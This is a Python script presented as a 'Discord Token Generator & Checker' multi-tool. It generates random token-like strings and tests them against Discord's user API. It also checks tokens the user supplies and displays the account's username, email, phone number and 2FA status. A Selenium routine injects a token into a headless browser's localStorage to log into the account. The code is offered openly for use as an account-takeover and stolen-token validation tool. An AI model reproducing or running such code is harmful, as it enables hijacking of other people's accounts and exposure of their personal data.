import random
import string
import requests
import time
from colorama import Fore, Style, Back, init
import os
import json
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from datetime import datetime
import sys
from typing import Tuple, Optional, Dict, Any

init(autoreset=True)

ASCII_ART = f"""{Fore.LIGHTRED_EX}
╔══════════════════════════════════════════════════════════════════════════════╗
║     ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗      ██╗ ██████╗   ║
║     ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ███║██╔════╝   ║
{Fore.LIGHTGREEN_EX}║     ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ╚██║███████╗   ║
║     ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║     ██║╚════██║   ║
{Fore.LIGHTBLUE_EX}║     ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝     ██║███████║   ║
║     ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝      ╚═╝╚══════╝   ║
║                          MULTI TOOL BY ASICS                                  ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""

BANNER = f"""
{Fore.LIGHTRED_EX}╔══════════════════════════════════════════════════════════════════════════════╗
{Fore.LIGHTGREEN_EX}║                     Discord Token Generator & Checker v2.0                      ║
{Fore.LIGHTBLUE_EX}║                        [Developed with ♥ by asics]                            ║
{Fore.LIGHTRED_EX}╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

def print_header():
    clear_screen()
    print(ASCII_ART)
    print(BANNER)
    print_timestamp()

def print_timestamp():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"{Fore.LIGHTBLACK_EX}[{timestamp}] Session Started{Style.RESET_ALL}\n")

def print_menu():
    print(f"{Fore.LIGHTRED_EX}╔══════════════════════════ MENU ══════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX}║{Style.RESET_ALL} [{Fore.LIGHTGREEN_EX}1{Style.RESET_ALL}] Generate and Check Single Token                    {Fore.LIGHTRED_EX}║{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX}║{Style.RESET_ALL} [{Fore.LIGHTGREEN_EX}2{Style.RESET_ALL}] Generate and Check Multiple Tokens                 {Fore.LIGHTRED_EX}║{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX}║{Style.RESET_ALL} [{Fore.LIGHTGREEN_EX}3{Style.RESET_ALL}] Check Existing Token                              {Fore.LIGHTRED_EX}║{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX}║{Style.RESET_ALL} [{Fore.LIGHTRED_EX}4{Style.RESET_ALL}] Exit                                               {Fore.LIGHTRED_EX}║{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX}╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_loading(message):
    print(f"\n{Fore.YELLOW}[*] {message}...{Style.RESET_ALL}")
    time.sleep(0.5)

def print_success(message):
    print(f"{Fore.GREEN}[+] {message}{Style.RESET_ALL}")

def print_error(message):
    print(f"{Fore.RED}[-] {message}{Style.RESET_ALL}")

def print_info(message):
    """Modified to handle colorful token display with strict colors"""
    if "Generated Token:" in message:
        token = message.split(": ")[1]
        token_parts = [token[i:i+20] for i in range(0, len(token), 20)]
        colors = [Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX]
        colorful_token = ''.join(f"{color}{part}" for color, part in zip(colors, token_parts))
        print(f"{Fore.LIGHTBLUE_EX}[i] Generated Token: {colorful_token}{Style.RESET_ALL}")
    else:
        print(f"{Fore.LIGHTBLUE_EX}[i] {message}{Style.RESET_ALL}")

def generate_token():
    """Generate a random Discord-like token"""
    token = ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=59))
    return f"MT{token}"

def handle_error(error: Exception, message: str) -> None:
    """Handle errors with proper formatting and logging"""
    error_type = type(error).__name__
    print(f"{Fore.RED}╔══════════════ ERROR ══════════════╗{Style.RESET_ALL}")
    print(f"{Fore.RED}║{Style.RESET_ALL} Type: {Fore.LIGHTRED_EX}{error_type}{Style.RESET_ALL}")
    print(f"{Fore.RED}║{Style.RESET_ALL} Message: {Fore.LIGHTRED_EX}{message}{Style.RESET_ALL}")
    print(f"{Fore.RED}║{Style.RESET_ALL} Details: {Fore.LIGHTRED_EX}{str(error)}{Style.RESET_ALL}")
    print(f"{Fore.RED}╚════════════════════════════════════╝{Style.RESET_ALL}")

def safe_input(prompt: str, default: str = "") -> str:
    """Safely handle user input with error handling"""
    try:
        return input(prompt)
    except (EOFError, KeyboardInterrupt):
        print("\nProgram interrupted by user.")
        sys.exit(0)
    except Exception as e:
        handle_error(e, "Error reading input")
        return default

def setup_driver() -> Optional[webdriver.Chrome]:
    """Setup Chrome driver with error handling"""
    try:
        print_loading("Initializing web driver")
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--disable-gpu')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        return webdriver.Chrome(options=options)
    except Exception as e:
        handle_error(e, "Failed to initialize Chrome driver")
        return None

def check_token_selenium(token: str) -> bool:
    """Check token validity using Selenium with enhanced error handling"""
    driver = setup_driver()
    if not driver:
        return False
        
    try:
        print_loading("Attempting Discord web verification")
        driver.get('https://discord.com/login')
        
        script = f'''
        setInterval(() => {{
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"{token}"`;
        }}, 50);
        setTimeout(() => {{
            location.reload();
        }}, 2500);
        '''
        driver.execute_script(script)
        
        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CLASS_NAME, 'container-1NXEtd'))
            )
            return True
        except TimeoutException:
            print_error("Login verification timed out")
            return False
            
    except Exception as e:
        handle_error(e, "Error during web verification")
        return False
    finally:
        try:
            driver.quit()
        except Exception as e:
            handle_error(e, "Error closing web driver")

def check_token_api(token: str) -> Tuple[bool, Optional[Dict[str, Any]]]:
    """Check token using Discord API with enhanced error handling"""
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    try:
        print_loading("Checking token through Discord API")
        response = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers=headers,
            timeout=5
        )
        
        if response.status_code == 200:
            return True, response.json()
        elif response.status_code == 401:
            print_error("Invalid token")
        elif response.status_code == 403:
            print_error("Token lacks required permissions")
        elif response.status_code == 429:
            print_error("Rate limited by Discord")
        else:
            print_error(f"Unexpected status code: {response.status_code}")
        return False, None
        
    except requests.Timeout:
        print_error("Request timed out")
    except requests.ConnectionError:
        print_error("Connection error")
    except Exception as e:
        handle_error(e, "Error checking token through API")
    return False, None

def display_token_info(token, user_data):
    """Display detailed token information with strict color scheme"""
    # Split token into parts for colorful display
    token_parts = [token[i:i+20] for i in range(0, len(token), 20)]
    colors = [Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX]
    colorful_token = ''.join(f"{color}{part}" for color, part in zip(colors, token_parts))
    
    print(f"\n{Fore.LIGHTRED_EX}╔══════════════ TOKEN INFORMATION ══════════════╗{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX}║{Style.RESET_ALL} Token: {colorful_token}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX}║{Style.RESET_ALL} Username: {Fore.LIGHTGREEN_EX}{user_data.get('username', 'N/A')}#{user_data.get('discriminator', 'N/A')}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX}║{Style.RESET_ALL} Email: {Fore.LIGHTBLUE_EX}{user_data.get('email', 'N/A')}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX}║{Style.RESET_ALL} Phone: {Fore.LIGHTMAGENTA_EX}{user_data.get('phone', 'N/A')}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX}║{Style.RESET_ALL} 2FA Enabled: {Fore.LIGHTGREEN_EX}{user_data.get('mfa_enabled', False)}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX}║{Style.RESET_ALL} Verified: {Fore.LIGHTBLUE_EX}{user_data.get('verified', False)}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX}╚═══════════════════════════════════════════════╝{Style.RESET_ALL}")

def check_token(token):
    """Comprehensive token check"""
    api_valid, user_data = check_token_api(token)
    
    if api_valid:
        print_success("Token is valid!")
        display_token_info(token, user_data)
        
        print_loading("Performing additional verification")
        web_valid = check_token_selenium(token)
        
        if web_valid:
            print_success("Token successfully verified through Discord web!")
        else:
            print_error("Token failed web verification!")
            
        return True
    else:
        return False

def print_warning(message):
    print(f"{Fore.YELLOW}[!] {message}{Style.RESET_ALL}")

def main() -> None:
    """Main function with comprehensive error handling"""
    try:
        while True:
            try:
                print_header()
                print_menu()
                
                choice = safe_input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} Enter your choice (1-4): ")
                
                if choice == '1':
                    token = generate_token()
                    print_info(f"Generated Token: {token}")
                    check_token(token)
                    
                elif choice == '2':
                    try:
                        count_input = safe_input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} How many tokens to generate? ")
                        count = int(count_input)
                        if count <= 0:
                            raise ValueError("Count must be positive")
                        if count > 100:
                            print_warning("Large number of tokens may take a while")
                            
                        for i in range(count):
                            try:
                                print(f"\n{Fore.CYAN}═══════════ Token {i+1}/{count} ═══════════{Style.RESET_ALL}")
                                token = generate_token()
                                token_parts = [token[i:i+20] for i in range(0, len(token), 20)]
                                colors = [Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX]
                                colorful_token = ''.join(f"{color}{part}" for color, part in zip(colors, token_parts))
                                print(f"{Fore.LIGHTBLUE_EX}[i] Generated Token: {colorful_token}{Style.RESET_ALL}")
                                check_token(token)
                                time.sleep(0.5)
                            except Exception as e:
                                handle_error(e, f"Error processing token {i+1}")
                                continue
                                
                    except ValueError as e:
                        print_error("Please enter a valid number")
                    except Exception as e:
                        handle_error(e, "Error in token generation")
                    
                elif choice == '3':
                    token = safe_input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} Enter token to check: ")
                    if not token.strip():
                        print_error("Token cannot be empty")
                        continue
                    check_token(token)
                    
                elif choice == '4':
                    print_info("Thanks for using Discord Token Checker!")
                    break
                else:
                    print_error("Invalid choice")
                
                safe_input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} Press Enter to continue...")
                
            except Exception as e:
                handle_error(e, "Error in main menu")
                safe_input("\nPress Enter to continue...")
                
    except KeyboardInterrupt:
        print("\nProgram interrupted by user")
        sys.exit(0)
    except Exception as e:
        handle_error(e, "Critical error")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        handle_error(e, "Fatal error")
        sys.exit(1) 
